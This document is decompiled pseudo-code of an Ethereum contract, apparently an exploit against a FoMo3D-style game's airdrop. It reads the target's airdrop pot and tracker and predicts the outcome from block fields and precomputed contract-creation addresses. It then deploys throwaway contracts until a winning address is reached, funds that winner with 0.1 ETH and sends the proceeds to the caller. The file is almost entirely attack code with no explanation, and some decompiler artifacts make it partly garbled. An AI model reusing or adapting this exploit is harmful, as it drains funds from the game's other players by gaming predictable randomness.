contract main {




// =====================  Runtime code  =====================


uint256 stor0;

function kill() payable {
    require msg.sender == 0x6fae851378b9c1499d4fe9d01895c515365ed9dc
    selfdestruct(0x6fae851378b9c1499d4fe9d01895c515365ed9dc)
}

function _fallback() payable {
    revert
}

function run() payable {
    require ext_code.size(0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c)
    call 0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c.airDropPot_() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if ext_call.return_data[0] >= 4 * 10^17:
        require ext_code.size(0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c)
        call 0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c.airDropTracker_() with:
             gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        mem[128] = address(block.coinbase)
        mem[96] = 20
        mem[64] = 148
        mem[148 len 0] = None
        mem[148 len 20] = address(block.coinbase, 0)
        require block.timestamp
        s = 0
        t = 0
        idx = 0
        u = stor0
        v = 0
        while idx <= 10:
            require u <= test266151307()
            if 0 >= u:
                w = 1
                x = 0
                while u >= w:
                    w = 256 * w
                    x = x + 1
                    continue 
                if u <= 0:
                    _772 = mem[64]
                    mem[64] = mem[64] + 32
                    mem[_772] = (address(this.address) << 80) + (x + 214 << 248) + (x + 128 << 72) + (u * 256^(-x + 9)) + 0x94000000000000000000000000000000000000000000000000000000000000
                    _773 = sha3(mem[_772 len x + 23])
                    _776 = mem[64]
                    mem[mem[64] + 32] = address(sha3(mem[_772 len x + 23]))
                    _777 = mem[64]
                    mem[mem[64]] = 20
                    mem[64] = mem[64] + 52
                    _779 = mem[_777]
                    t = _777 + 32
                    w = _776 + 52
                    s = mem[_777]
                    while s >= 32:
                        mem[w] = mem[t]
                        t = t + 32
                        w = w + 32
                        s = s - 32
                        continue 
                    mem[_776 + floor32(mem[_777]) + 52] = mem[_776 + floor32(mem[_777]) + 52] and 256^(-(mem[_777] % 32) + 32) - 1 or mem[_777 + floor32(mem[_777]) + 32] and !(256^(-(mem[_777] % 32) + 32) - 1)
                    require block.timestamp
                    mem[_776 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_776 + 52 len _779]) / block.timestamp)
                    mem[_776 + 52] = 32
                    mem[64] = _776 + 116
                    t = _776 + 84
                    w = _776 + 116
                    s = 32
                    while s >= 32:
                        mem[w] = mem[t]
                        t = t + 32
                        w = w + 32
                        s = s - 32
                        continue 
                    if sha3(mem[_776 + 116]) - (1000 * sha3(mem[_776 + 116]) / 1000) >= ext_call.return_data[0] + 1:
                        s = sha3(mem[_776 + 116]) - (1000 * sha3(mem[_776 + 116]) / 1000)
                        t = _773
                        idx = idx + 1
                        u = u + 1
                        v = v + 1
                        continue 
                else:
                    if u >= 128:
                        _780 = mem[64]
                        mem[64] = mem[64] + 32
                        mem[_780] = (address(this.address) << 80) + (x + 214 << 248) + (x + 128 << 72) + (u * 256^(-x + 9)) + 0x94000000000000000000000000000000000000000000000000000000000000
                        _781 = sha3(mem[_780 len x + 23])
                        _792 = mem[64]
                        mem[mem[64] + 32] = address(sha3(mem[_780 len x + 23]))
                        _793 = mem[64]
                        mem[mem[64]] = 20
                        mem[64] = mem[64] + 52
                        _795 = mem[_793]
                        x = _793 + 32
                        y = _792 + 52
                        w = mem[_793]
                        while w >= 32:
                            mem[y] = mem[x]
                            x = x + 32
                            y = y + 32
                            w = w - 32
                            continue 
                        mem[_792 + floor32(mem[_793]) + 52] = mem[_792 + floor32(mem[_793]) + 52] and 256^(-(mem[_793] % 32) + 32) - 1 or mem[_793 + floor32(mem[_793]) + 32] and !(256^(-(mem[_793] % 32) + 32) - 1)
                        require block.timestamp
                        mem[_792 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_792 + 52 len _795]) / block.timestamp)
                        mem[_792 + 52] = 32
                        mem[64] = _792 + 116
                        s = _792 + 84
                        t = _792 + 116
                        idx = 32
                        while idx >= 32:
                            mem[t] = mem[s]
                            s = s + 32
                            t = t + 32
                            idx = idx - 32
                            continue 
                        if sha3(mem[_792 + 116]) - (1000 * sha3(mem[_792 + 116]) / 1000) >= ext_call.return_data[0] + 1:
                            x = sha3(mem[_792 + 116]) - (1000 * sha3(mem[_792 + 116]) / 1000)
                            y = _781
                            w = w + 1
                            u = u + 1
                            v = v + 1
                            continue 
                    else:
                        _782 = mem[64]
                        mem[64] = mem[64] + 32
                        mem[_782] = (address(this.address) << 80) + (x + 214 << 248) + (u << 72) + 0x94000000000000000000000000000000000000000000000000000000000000
                        _783 = sha3(mem[_782 len x + 23])
                        _796 = mem[64]
                        mem[mem[64] + 32] = address(sha3(mem[_782 len x + 23]))
                        _797 = mem[64]
                        mem[mem[64]] = 20
                        mem[64] = mem[64] + 52
                        _799 = mem[_797]
                        x = _797 + 32
                        y = _796 + 52
                        w = mem[_797]
                        while w >= 32:
                            mem[y] = mem[x]
                            x = x + 32
                            y = y + 32
                            w = w - 32
                            continue 
                        mem[_796 + floor32(mem[_797]) + 52] = mem[_796 + floor32(mem[_797]) + 52] and 256^(-(mem[_797] % 32) + 32) - 1 or mem[_797 + floor32(mem[_797]) + 32] and !(256^(-(mem[_797] % 32) + 32) - 1)
                        require block.timestamp
                        mem[_796 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_796 + 52 len _799]) / block.timestamp)
                        mem[_796 + 52] = 32
                        mem[64] = _796 + 116
                        s = _796 + 84
                        t = _796 + 116
                        idx = 32
                        while idx >= 32:
                            mem[t] = mem[s]
                            s = s + 32
                            t = t + 32
                            idx = idx - 32
                            continue 
                        if sha3(mem[_796 + 116]) - (1000 * sha3(mem[_796 + 116]) / 1000) >= ext_call.return_data[0] + 1:
                            x = sha3(mem[_796 + 116]) - (1000 * sha3(mem[_796 + 116]) / 1000)
                            y = _783
                            w = w + 1
                            u = u + 1
                            v = v + 1
                            continue 
            else:
                if u < 128:
                    if u <= 0:
                        _496 = mem[64]
                        mem[64] = mem[64] + 32
                        mem[_496] = (address(this.address) << 80) + (u << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000
                        _498 = mem[64]
                        mem[mem[64] + 32] = address(sha3(Mask(184, 72, (address(this.address) << 80) + (u << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000) >> 72))
                        _499 = mem[64]
                        mem[mem[64]] = 20
                        mem[64] = mem[64] + 52
                        _501 = mem[_499]
                        t = _499 + 32
                        w = _498 + 52
                        s = mem[_499]
                        while s >= 32:
                            mem[w] = mem[t]
                            t = t + 32
                            w = w + 32
                            s = s - 32
                            continue 
                        mem[_498 + floor32(mem[_499]) + 52] = mem[_498 + floor32(mem[_499]) + 52] and 256^(-(mem[_499] % 32) + 32) - 1 or mem[_499 + floor32(mem[_499]) + 32] and !(256^(-(mem[_499] % 32) + 32) - 1)
                        require block.timestamp
                        mem[_498 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_498 + 52 len _501]) / block.timestamp)
                        mem[_498 + 52] = 32
                        mem[64] = _498 + 116
                        t = _498 + 84
                        w = _498 + 116
                        s = 32
                        while s >= 32:
                            mem[w] = mem[t]
                            t = t + 32
                            w = w + 32
                            s = s - 32
                            continue 
                        if sha3(mem[_498 + 116]) - (1000 * sha3(mem[_498 + 116]) / 1000) >= ext_call.return_data[0] + 1:
                            s = sha3(mem[_498 + 116]) - (1000 * sha3(mem[_498 + 116]) / 1000)
                            t = sha3(Mask(184, 72, (address(this.address) << 80) + (u << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000) >> 72)
                            idx = idx + 1
                            u = u + 1
                            v = v + 1
                            continue 
                    else:
                        if u >= 128:
                            _502 = mem[64]
                            mem[64] = mem[64] + 32
                            mem[_502] = (address(this.address) << 80) + (u << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000
                            _506 = mem[64]
                            mem[mem[64] + 32] = address(sha3(Mask(184, 72, (address(this.address) << 80) + (u << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000) >> 72))
                            _507 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _509 = mem[_507]
                            x = _507 + 32
                            y = _506 + 52
                            w = mem[_507]
                            while w >= 32:
                                mem[y] = mem[x]
                                x = x + 32
                                y = y + 32
                                w = w - 32
                                continue 
                            mem[_506 + floor32(mem[_507]) + 52] = mem[_506 + floor32(mem[_507]) + 52] and 256^(-(mem[_507] % 32) + 32) - 1 or mem[_507 + floor32(mem[_507]) + 32] and !(256^(-(mem[_507] % 32) + 32) - 1)
                            require block.timestamp
                            mem[_506 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_506 + 52 len _509]) / block.timestamp)
                            mem[_506 + 52] = 32
                            mem[64] = _506 + 116
                            x = _506 + 84
                            y = _506 + 116
                            w = 32
                            while w >= 32:
                                mem[y] = mem[x]
                                x = x + 32
                                y = y + 32
                                w = w - 32
                                continue 
                            if sha3(mem[_506 + 116]) - (1000 * sha3(mem[_506 + 116]) / 1000) >= ext_call.return_data[0] + 1:
                                x = sha3(mem[_506 + 116]) - (1000 * sha3(mem[_506 + 116]) / 1000)
                                y = sha3(Mask(184, 72, (address(this.address) << 80) + (u << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000) >> 72)
                                w = 1
                                u = u + 1
                                v = v + 1
                                continue 
                        else:
                            _504 = mem[64]
                            mem[64] = mem[64] + 32
                            mem[_504] = (address(this.address) << 80) + (u << 72) - 0x296c000000000000000000000000000000000000000000000000000000000000
                            _510 = mem[64]
                            mem[mem[64] + 32] = address(sha3(Mask(184, 72, (address(this.address) << 80) + (u << 72) - 0x296c000000000000000000000000000000000000000000000000000000000000) >> 72))
                            _511 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _513 = mem[_511]
                            x = _511 + 32
                            y = _510 + 52
                            w = mem[_511]
                            while w >= 32:
                                mem[y] = mem[x]
                                x = x + 32
                                y = y + 32
                                w = w - 32
                                continue 
                            mem[_510 + floor32(mem[_511]) + 52] = mem[_510 + floor32(mem[_511]) + 52] and 256^(-(mem[_511] % 32) + 32) - 1 or mem[_511 + floor32(mem[_511]) + 32] and !(256^(-(mem[_511] % 32) + 32) - 1)
                            require block.timestamp
                            mem[_510 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_510 + 52 len _513]) / block.timestamp)
                            mem[_510 + 52] = 32
                            mem[64] = _510 + 116
                            x = _510 + 84
                            y = _510 + 116
                            w = 32
                            while w >= 32:
                                mem[y] = mem[x]
                                x = x + 32
                                y = y + 32
                                w = w - 32
                                continue 
                            if sha3(mem[_510 + 116]) - (1000 * sha3(mem[_510 + 116]) / 1000) >= ext_call.return_data[0] + 1:
                                x = sha3(mem[_510 + 116]) - (1000 * sha3(mem[_510 + 116]) / 1000)
                                y = sha3(Mask(184, 72, (address(this.address) << 80) + (u << 72) - 0x296c000000000000000000000000000000000000000000000000000000000000) >> 72)
                                w = 1
                                u = u + 1
                                v = v + 1
                                continue 
                else:
                    w = 1
                    x = 0
                    while u >= w:
                        w = 256 * w
                        x = x + 1
                        continue 
                    if u <= 0:
                        _774 = mem[64]
                        mem[64] = mem[64] + 32
                        mem[_774] = (address(this.address) << 80) + (x + 214 << 248) + (x + 128 << 72) + (u * 256^(-x + 9)) + 0x94000000000000000000000000000000000000000000000000000000000000
                        _775 = sha3(mem[_774 len x + 23])
                        _784 = mem[64]
                        mem[mem[64] + 32] = address(sha3(mem[_774 len x + 23]))
                        _785 = mem[64]
                        mem[mem[64]] = 20
                        mem[64] = mem[64] + 52
                        _787 = mem[_785]
                        x = _785 + 32
                        y = _784 + 52
                        w = mem[_785]
                        while w >= 32:
                            mem[y] = mem[x]
                            x = x + 32
                            y = y + 32
                            w = w - 32
                            continue 
                        mem[_784 + floor32(mem[_785]) + 52] = mem[_784 + floor32(mem[_785]) + 52] and 256^(-(mem[_785] % 32) + 32) - 1 or mem[_785 + floor32(mem[_785]) + 32] and !(256^(-(mem[_785] % 32) + 32) - 1)
                        require block.timestamp
                        mem[_784 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_784 + 52 len _787]) / block.timestamp)
                        mem[_784 + 52] = 32
                        mem[64] = _784 + 116
                        s = _784 + 84
                        t = _784 + 116
                        idx = 32
                        while idx >= 32:
                            mem[t] = mem[s]
                            s = s + 32
                            t = t + 32
                            idx = idx - 32
                            continue 
                        if sha3(mem[_784 + 116]) - (1000 * sha3(mem[_784 + 116]) / 1000) >= ext_call.return_data[0] + 1:
                            x = sha3(mem[_784 + 116]) - (1000 * sha3(mem[_784 + 116]) / 1000)
                            y = _775
                            w = w + 1
                            u = u + 1
                            v = v + 1
                            continue 
                    else:
                        if u >= 128:
                            _788 = mem[64]
                            mem[64] = mem[64] + 32
                            mem[_788] = (address(this.address) << 80) + (x + 214 << 248) + (x + 128 << 72) + (u * 256^(-x + 9)) + 0x94000000000000000000000000000000000000000000000000000000000000
                            _789 = sha3(mem[_788 len x + 23])
                            _800 = mem[64]
                            mem[mem[64] + 32] = address(sha3(mem[_788 len x + 23]))
                            _801 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _803 = mem[_801]
                            t = _801 + 32
                            w = _800 + 52
                            s = mem[_801]
                            while s >= 32:
                                mem[w] = mem[t]
                                t = t + 32
                                w = w + 32
                                s = s - 32
                                continue 
                            mem[_800 + floor32(mem[_801]) + 52] = mem[_800 + floor32(mem[_801]) + 52] and 256^(-(mem[_801] % 32) + 32) - 1 or mem[_801 + floor32(mem[_801]) + 32] and !(256^(-(mem[_801] % 32) + 32) - 1)
                            require block.timestamp
                            mem[_800 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_800 + 52 len _803]) / block.timestamp)
                            mem[_800 + 52] = 32
                            mem[64] = _800 + 116
                            t = _800 + 84
                            w = _800 + 116
                            s = 32
                            while s >= 32:
                                mem[w] = mem[t]
                                t = t + 32
                                w = w + 32
                                s = s - 32
                                continue 
                            if sha3(mem[_800 + 116]) - (1000 * sha3(mem[_800 + 116]) / 1000) >= ext_call.return_data[0] + 1:
                                s = sha3(mem[_800 + 116]) - (1000 * sha3(mem[_800 + 116]) / 1000)
                                t = _789
                                idx = idx + 1
                                u = u + 1
                                v = v + 1
                                continue 
                        else:
                            _790 = mem[64]
                            mem[64] = mem[64] + 32
                            mem[_790] = (address(this.address) << 80) + (x + 214 << 248) + (u << 72) + 0x94000000000000000000000000000000000000000000000000000000000000
                            _791 = sha3(mem[_790 len x + 23])
                            _804 = mem[64]
                            mem[mem[64] + 32] = address(sha3(mem[_790 len x + 23]))
                            _805 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _807 = mem[_805]
                            t = _805 + 32
                            w = _804 + 52
                            s = mem[_805]
                            while s >= 32:
                                mem[w] = mem[t]
                                t = t + 32
                                w = w + 32
                                s = s - 32
                                continue 
                            mem[_804 + floor32(mem[_805]) + 52] = mem[_804 + floor32(mem[_805]) + 52] and 256^(-(mem[_805] % 32) + 32) - 1 or mem[_805 + floor32(mem[_805]) + 32] and !(256^(-(mem[_805] % 32) + 32) - 1)
                            require block.timestamp
                            mem[_804 + 84] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_804 + 52 len _807]) / block.timestamp)
                            mem[_804 + 52] = 32
                            mem[64] = _804 + 116
                            t = _804 + 84
                            w = _804 + 116
                            s = 32
                            while s >= 32:
                                mem[w] = mem[t]
                                t = t + 32
                                w = w + 32
                                s = s - 32
                                continue 
                            if sha3(mem[_804 + 116]) - (1000 * sha3(mem[_804 + 116]) / 1000) >= ext_call.return_data[0] + 1:
                                s = sha3(mem[_804 + 116]) - (1000 * sha3(mem[_804 + 116]) / 1000)
                                t = _791
                                idx = idx + 1
                                u = u + 1
                                v = v + 1
                                continue 
            s = 0
            while s < v:
                create contract with 0 wei
                                code: 13311
                s = s + 1
                continue 
            create contract with 100000000000000000 wei
                            code: code.data[1752 len 269], 0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c
            if not create.new_address:
                revert with ext_call.return_data[0 len return_data.size]
            require eth.balance(this.address) < eth.balance(this.address)
            call msg.sender with:
               value eth.balance(this.address) wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            stor0 = v + stor0 + 1
            return 1
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    else:
        return 0
}



}
